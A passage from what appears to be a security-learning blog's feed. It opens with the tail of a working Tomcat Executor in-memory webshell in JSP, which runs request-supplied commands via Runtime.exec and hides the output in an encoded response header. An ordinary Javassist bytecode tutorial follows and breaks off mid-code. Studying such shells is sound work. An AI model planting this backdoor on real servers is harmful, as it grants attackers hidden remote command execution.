function_">getResponse</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] res)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>));<br><br>                <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>                    <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">threadName</span> <span class="hljs-operator">=</span> thread.getName();<br>                        <span class="hljs-keyword">if</span> (!threadName.contains(<span class="hljs-string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                            <span class="hljs-keyword">if</span> (target <span class="hljs-keyword">instanceof</span> Runnable) &#123;<br>                                <span class="hljs-keyword">try</span> &#123;<br>                                    <span class="hljs-type">ArrayList</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> (ArrayList) getField(getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;handler&quot;</span>), <span class="hljs-string">&quot;global&quot;</span>), <span class="hljs-string">&quot;processors&quot;</span>);<br>                                    <span class="hljs-keyword">for</span> (Object tmp_object : objects) &#123;<br>                                        <span class="hljs-type">RequestInfo</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (RequestInfo) tmp_object;<br>                                        <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> (Response) getField(getField(request, <span class="hljs-string">&quot;req&quot;</span>), <span class="hljs-string">&quot;response&quot;</span>);<br>                                        response.addHeader(<span class="hljs-string">&quot;Server-token&quot;</span>, encode(DEFAULT_SECRET_KEY,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(res, <span class="hljs-string">&quot;UTF-8&quot;</span>)));<br><br>                                    &#125;<br>                                &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>                                    <span class="hljs-keyword">continue</span>;<br>                                &#125;<br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>            &#125;<br>        &#125;<br><br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(Runnable command)</span> &#123;<br><span class="hljs-comment">//            System.out.println(&quot;123&quot;);</span><br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> getRequest();<br>            <span class="hljs-keyword">if</span> (cmd.length() &gt; <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> rt.exec(cmd);<br>                    java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> process.getInputStream();<br><br>                    java.io.<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">resultReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(in);<br>                    java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">stdInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(resultReader);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                    <span class="hljs-keyword">while</span> ((tmp = stdInput.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                        s += tmp;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (s != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                        <span class="hljs-type">byte</span>[] res = s.getBytes(StandardCharsets.UTF_8);<br>                        getResponse(res);<br>                    &#125;<br><br><br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br><br><br>            <span class="hljs-built_in">this</span>.execute(command, <span class="hljs-number">0L</span>, TimeUnit.MILLISECONDS);<br>        &#125;<br><br>    &#125;<br><br>%&gt;<br><br>&lt;%<br>    <span class="hljs-type">NioEndpoint</span> <span class="hljs-variable">nioEndpoint</span> <span class="hljs-operator">=</span> (NioEndpoint) getStandardService();<br>    <span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> (ThreadPoolExecutor) getField(nioEndpoint, <span class="hljs-string">&quot;executor&quot;</span>);<br>    <span class="hljs-type">threadexcutor</span> <span class="hljs-variable">exe</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">threadexcutor</span>(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());<br>    nioEndpoint.setExecutor(exe);<br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实前面的传统web应用内存马也是tomcat这部分的，因为它基于tomcat进行分析不过问题不大，别的中间件应该也是有这些基本组件的。&lt;/p&gt;
&lt;h1 id=&quot;tomcat-valve内存马&quot;&gt;&lt;a href=&quot;#Tomcat-Valve内存马&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="内存马" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>javassist学习</title>
    <link href="https://clowsman.github.io/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-05T15:35:52.000Z</published>
    <updated>2024-09-07T09:56:25.699Z</updated>
    
    <content type="html"><![CDATA[<p>因为看到在缩短payload的时候会用到，赶紧来学习一下，参考文章：<a href="https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/">https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</a></p><p>这是官方文档：<a href="http://www.javassist.org/tutorial/tutorial.html">http://www.javassist.org/tutorial/tutorial.html</a></p><h1 id="javassist介绍"><a href="#javassist介绍" class="headerlink" title="javassist介绍"></a>javassist介绍</h1><p>Javassist 是一个开源的分析、编辑和创建Java字节码的类库.；其主要优点在于简单快速. 直接使用 java 编码的形式, 而不需要了解虚拟机指令, 就能动态改变类的结构, 或者动态生成类。</p><p>使用前导入jar包</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Javassist中最为重要的是<code>ClassPool</code>,<code>CtClass</code>, <code>CtMethod</code>以及<code>CtField</code>这几个类.</p><ul><li><code>ClassPool</code>: 一个基于<code>Hashtable</code>实现的<code>CtClass</code>对象容器, 其中键是类名称, 值是表示该类的<code>CtClass</code>对象</li><li><code>CtClass</code>: <code>CtClass</code>表示类, 一个<code>CtClass</code>(编译时类)对象可以处理一个class文件, 这些<code>CtClass</code>对象可以从<code>ClassPool</code>获得</li><li><code>CtMethod</code>: 表示类中的方法</li><li><code>CtField</code>: 表示类中的字段</li><li><code>CtConstructor</code>:可读写的类构造方法对象</li></ul><h1 id="classpool相关方法"><a href="#ClassPool相关方法" class="headerlink" title="ClassPool相关方法"></a>ClassPool相关方法</h1><ul><li><code>getDefault</code>: 返回默认的<code>ClassPool</code>是单例模式的，一般通过该方法创建我们的<code>ClassPool</code>；</li><li><code>appendClassPath</code>, <code>insertClassPath</code> : 将一个<code>ClassPath</code>加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬；</li><li><code>toClass</code> : 将修改后的<code>CtClass</code>加载至当前线程的上下文类加载器中，<code>CtClass</code>的<code>toClass</code>方法是通过调用本方法实现。需要注意的是一旦调用该方法，则无法继续修改已经被加载的class；</li><li><code>get</code> , <code>getCtClass</code>: 根据类路径名获取该类的<code>CtClass</code>对象，用于后续的编辑。</li></ul><p>ClassPool对象的创建</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取ClassPool对象, 使用系统默认类路径</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 效果与 new ClassPool(true) 一致，只不过返回的是默认的单例模式</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br></code></pre></td></tr></table></figure><p>为减少ClassPool可能导致的内存消耗； 可以从ClassPool中删除不必要的CtClass对象. 或者每次创建新的ClassPool对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 从ClassPool中删除CtClass对象</span><br>ctClass.detach();<br><span class="hljs-comment">// 也可以每次创建一个新的ClassPool, 而不是ClassPool.getDefault(), 避免内存溢出</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><h1 id="ctclass相关方法"><a href="#CtClass相关方法" class="headerlink" title="CtClass相关方法"></a>CtClass相关方法</h1><ul><li>freeze: 冻结一个类，使其不可修改；</li><li>isFrozen : 判断一个类是否已被冻结；</li><li>prune : 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用；</li><li>defrost : 解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用 prune 方法；</li><li>detach : 将该class从ClassPool中删除；</li><li>writeFile : 根据CtClass生成 .class 文件；</li><li>toClass : 通过类加载器加载该CtClass。</li><li>setInterfaces: 添加父接口</li><li>setSuperclass: 添加父类</li></ul><h2 id="获取ctclass"><a href="#获取CtClass" class="headerlink" title="获取CtClass"></a>获取CtClass</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<span class="hljs-comment">//未获取到类或抛异常</span><br><span class="hljs-comment">// 通过类名获取 CtClass, 未找到返回 null, 不会抛出异常</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass1</span> <span class="hljs-operator">=</span> pool.getOrNull(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br>ctClass.freeze();<span class="hljs-comment">//冻结类，即不能修改</span><br>System.out.println(ctClass.isFrozen());<span class="hljs-comment">//检查是否冻结，即不可修改</span><br></code></pre></td></tr></table></figure><h2 id="创建ctclass"><a href="#创建CtClass" class="headerlink" title="创建CtClass"></a>创建CtClass</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 复制一个类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass2</span> <span class="hljs-operator">=</span> pool.getAndRename(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>, <span class="hljs-string">&quot;org.clown.ssist.Teacher&quot;</span>);<br><span class="hljs-comment">// 创建一个新类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass3</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br><span class="hljs-comment">// 通过class文件创建一个新类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass4</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;target/classes/org/clown/ssist/Student.class&quot;</span>)));<br></code></pre></td></tr></table></figure><p>创建一个类然后写入</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//创建新类并写入</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071508005.png" alt="image-20240907150758908"></p><p>然后就会根据名称保存到对应的目录下，将类持久化了到文件中</p><h2 id="ctclass基础信息"><a href="#CtClass基础信息" class="headerlink" title="CtClass基础信息"></a>CtClass基础信息</h2><p>就是一些类的各种基础信息，类全名、类方法、类字段等</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 类名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">simpleName</span> <span class="hljs-operator">=</span> ctClass.getSimpleName();<br><span class="hljs-comment">// 类全名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> ctClass.getName();<br><span class="hljs-comment">// 包名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">packageName</span> <span class="hljs-operator">=</span> ctClass.getPackageName();<br><span class="hljs-comment">// 接口</span><br>CtClass[] interfaces = ctClass.getInterfaces();<br><span class="hljs-comment">// 继承类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">superclass</span> <span class="hljs-operator">=</span> ctClass.getSuperclass();<br><span class="hljs-comment">// 获取类方法</span><br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;getName()&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;pool.get(String.class.getName()), pool.get(String.class.getName())&#125;);<br><span class="hljs-comment">// 获取类字段</span><br><span class="hljs-type">CtField</span> <span class="hljs-variable">ctField</span> <span class="hljs-operator">=</span> ctClass.getField(<span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">// 判断数组类型</span><br>ctClass.isArray();<br><span class="hljs-comment">// 判断原生类型</span><br>ctClass.isPrimitive();<br><span class="hljs-comment">// 判断接口类型</span><br>ctClass.isInterface();<br><span class="hljs-comment">// 判断枚举类型</span><br>ctClass.isEnum();<br><span class="hljs-comment">// 判断注解类型</span><br>ctClass.isAnnotation();<br><span class="hljs-comment">// 冻结一个类，使其不可修改</span><br>ctClass.freeze () <br><span class="hljs-comment">// 判断一个类是否已被冻结</span><br>ctClass.isFrozen()<br><span class="hljs-comment">// 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用</span><br>ctClass.prune() <br><span class="hljs-comment">//解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用prune方法</span><br>ctClass.defrost()<br></code></pre></td></tr></table></figure><h2 id="对ctclass进行操作"><a href="#对CtClass进行操作" class="headerlink" title="对CtClass进行操作"></a>对CtClass进行操作</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 添加接口</span><br>ctClass.addInterface(...);<br><span class="hljs-comment">// 添加构造器</span><br>ctClass.addConstructor(...);<br><span class="hljs-comment">// 添加字段</span><br>ctClass.addField(...);<br><span class="hljs-comment">// 添加方法</span><br>ctClass.addMethod(...);<br></code></pre></td></tr></table></figure><h2 id="ctclass编译"><a href="#CtClass编译" class="headerlink" title="CtClass编译"></a>CtClass编译</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取字节码文件 需要注意的是一旦调用该方法，则无法继续修改已经被加载的class</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> ctClass.toClass();<br><span class="hljs-comment">// 类的字节码文件</span><br><span class="hljs-type">ClassFile</span> <span class="hljs-variable">classFile</span> <span class="hljs-operator">=</span> ctClass.getClassFile();<br><span class="hljs-comment">// 编译成字节码文件, 使用当前线程上下文类加载器加载类, 如果类已存在或者编译失败将抛出异常</span><br><span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br></code></pre></td></tr></table></figure><h1 id="ctmethod相关方法"><a href="#CtMethod相关方法" class="headerlink" title="CtMethod相关方法"></a>CtMethod相关方法</h1><p><code>CtMthod</code>代表类中的某个方法，可以通过<code>CtClass</code>提供的API获取或者<code>CtNewMethod</code>新建，通过<code>CtMethod</code>对象可以实现对方法的修改。</p><p>CtNewMethod有点类似一个工具类，里面的方法都是静态方法，比如生成一个新的CtMethod</p><p><img src="https://cdn.clown2024.cn/202409060034713.png" alt="image-20240906003402632"></p><ul><li><p>insertBefore : 在方法的起始位置插入代码；</p></li><li><p>insterAfter : 在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception；</p></li><li><p>insertAt : 在指定的位置插入代码；</p></li><li><p>setBody: 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除；</p></li><li><p>make : 创建一个新的方法，本质就是调用CtNewMethod#make</p><p><img src="https://cdn.clown2024.cn/202409060035377.png" alt="image-20240906003533328"></p></li></ul><h2 id="ctmethod属性获取"><a href="#CtMethod属性获取" class="headerlink" title="CtMethod属性获取"></a>CtMethod属性获取</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass5</span> <span class="hljs-operator">=</span> pool.get(TestService.class.getName());<br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass5.getDeclaredMethod(<span class="hljs-string">&quot;selectOrder&quot;</span>);<br><span class="hljs-comment">// 方法名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> ctMethod.getName();<br><span class="hljs-comment">// 返回类型</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">returnType</span> <span class="hljs-operator">=</span> ctMethod.getReturnType();<br><span class="hljs-comment">// 方法参数, 通过此种方式得到方法参数列表</span><br><span class="hljs-comment">// 格式: com.kawa.TestService.getOrder(java.lang.String,java.util.List)</span><br>ctMethod.getLongName();<br><span class="hljs-comment">// 方法签名 格式: (Ljava/lang/String;Ljava/util/List;Lcom/test/Order;)Ljava/lang/Integer;</span><br>ctMethod.getSignature();<br><br><span class="hljs-comment">// 获取方法参数名称, 可以通过这种方式得到方法真实参数名称</span><br>List&lt;String&gt; argKeys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><span class="hljs-type">MethodInfo</span> <span class="hljs-variable">methodInfo</span> <span class="hljs-operator">=</span> ctMethod.getMethodInfo();<br><span class="hljs-type">CodeAttribute</span> <span class="hljs-variable">codeAttribute</span> <span class="hljs-operator">=</span> methodInfo.getCodeAttribute();<br><span class="hljs-type">LocalVariableAttribute</span> <span class="hljs-variable">attr</span> <span class="hljs-operator">=</span> (LocalVariableAttribute) codeAttribute.getAttribute(LocalVariableAttribute.tag);<br><span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> ctMethod.getParameterTypes().length;<br><span class="hljs-comment">// 非静态的成员函数的第一个参数是this</span><br><span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> Modifier.isStatic(ctMethod.getModifiers()) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> pos; i &lt; len; i++) &#123;<br>    argKeys.add(attr.variableName(i));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ctmethod方法体修改"><a href="#CtMethod方法体修改" class="headerlink" title="CtMethod方法体修改"></a>CtMethod方法体修改</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 在方法体前插入代码块</span><br>ctMethod.insertBefore(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 在方法体后插入代码块</span><br>ctMethod.insertAfter(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 在某行 字节码 后插入代码块</span><br>ctMethod.insertAt(<span class="hljs-number">10</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 添加参数</span><br>ctMethod.addParameter(CtClass);<br><span class="hljs-comment">// 设置方法名</span><br>ctMethod.setName(<span class="hljs-string">&quot;newName&quot;</span>);<br><span class="hljs-comment">// 设置方法体 $0=this / $1,$2,$3... 代表方法参数</span><br>ctMethod.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<br><span class="hljs-comment">//创建一个新的方法</span><br>ctMethod.make(<span class="hljs-string">&quot;kawa&quot;</span>,CtClass);<br></code></pre></td></tr></table></figure><h2 id="异常块添加"><a href="#异常块添加" class="headerlink" title="异常块添加"></a>异常块添加</h2><p>在方法中加入try catch块, 需要注意的是, 必须在插入的代码中, 加入return值$e代表异常信息.插入的代码片段必须以throw或return语句结束</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ...;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">etype</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;java.io.IOException&quot;</span>);<br>m.addCatch(<span class="hljs-string">&quot;&#123; System.out.println($e); throw $e; &#125;&quot;</span>, etype);<br><span class="hljs-comment">// 等同于添加如下代码: </span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// the original method body</span><br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    System.out.println(e);<br>    <span class="hljs-keyword">throw</span> e;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="类搜索路径"><a href="#类搜索路径" class="headerlink" title="类搜索路径"></a>类搜索路径</h1><p>我们前面获取的ClassPool他有自己的类搜索路径，如果程序运行在JBoss或Tomcat等web服务器上，可能会找不到用户自己的类，我们需要手动添加一个类搜索路径。</p><p>下面是各种添加类搜素路径的各种方式</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过ClassClassPath添加路径*/</span><br><span class="hljs-comment">// 将classpath插入到指定classpath之前</span><br>pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Student.getClass()));<br><span class="hljs-comment">// 将classpath添加到指定classpath之后</span><br>pool.appendClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(<span class="hljs-built_in">this</span>.getClass()));<br></code></pre></td></tr></table></figure><blockquote><p>该方式添加的时候，比如上面的Student.class，可以将class所在的整个jar添加到搜索路径</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*指定目录添加搜索路径*/</span><br><span class="hljs-comment">// 将一个目录作为classpath</span><br>pool.insertClassPath(<span class="hljs-string">&quot;/xxx/lib&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过url指定搜索路径*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">ClassPath</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassPath</span>(<span class="hljs-string">&quot;www.sample.com&quot;</span>, <span class="hljs-number">80</span>, <span class="hljs-string">&quot;/out/&quot;</span>, <span class="hljs-string">&quot;com.test&quot;</span>);<br>pool.insertClassPath(cp);<br></code></pre></td></tr></table></figure><blockquote><p>上述代码将<a href="http://www.sample.com/out%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%B1%BB%E6%90%9C%E7%B4%A2%E8%B7%AF%E5%BE%84%E3%80%82%E5%B9%B6%E4%B8%94%E8%BF%99%E4%B8%AAURL%E5%8F%AA%E8%83%BD%E6%90%9C%E7%B4%A2%60com.test%60%E5%8C%85%E9%87%8C%E9%9D%A2%E7%9A%84%E7%B1%BB%E3%80%82">http://www.sample.com:80/out添加到类搜索路径。并且这个URL只能搜索`com.test`包里面的类。</a></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过ByteArrayPath添加搜索路径*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">byte</span>[] buf = 字节数组;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> 类名;<br>cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayClassPath</span>(name, buf));<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.get(name);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过输入流加载class*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span>  class文件对应的输入流;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.makeClass(ins);<br></code></pre></td></tr></table></figure><h1 id="读写字节码"><a href="#读写字节码" class="headerlink" title="读写字节码"></a>读写字节码</h1><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;test.Rectangle&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p><code>ClassPool</code>的<code>getDefault()</code>方法将会查找系统默认的路径来搜索<code>test.Rectable</code>对象，然后将获取到的<code>CtClass</code>对象赋值给cc变量，如果对象没有被找到，那么<code>get()</code>方法就会创建出一个默认的<code>CtClass</code>对象，然后放入到<code>HashTable</code>中，同时将当前创建的对象返回。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] b = cc.toBytecode(); <span class="hljs-comment">//直接获取字节码</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cc.toClass(); <span class="hljs-comment">//获取Class</span><br></code></pre></td></tr></table></figure><p><code>toClass()</code>方法调用使得当前线程中的context class loader加载此CtClass类，然后生成<code>java.lang.Class</code>对象。</p><h1 id="对类的相关操作"><a href="#对类的相关操作" class="headerlink" title="对类的相关操作"></a>对类的相关操作</h1><p>主要还是学一下具体的使用，太深入的东西先不看，参考文章：<a href="https://blog.csdn.net/weixin_54902210/article/details/129562446">https://blog.csdn.net/weixin_54902210/article/details/129562446</a></p><p>这里基于前面创建的Hello类进行操作</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><h2 id="添加属性"><a href="#添加属性" class="headerlink" title="添加属性"></a>添加属性</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtField;<br><span 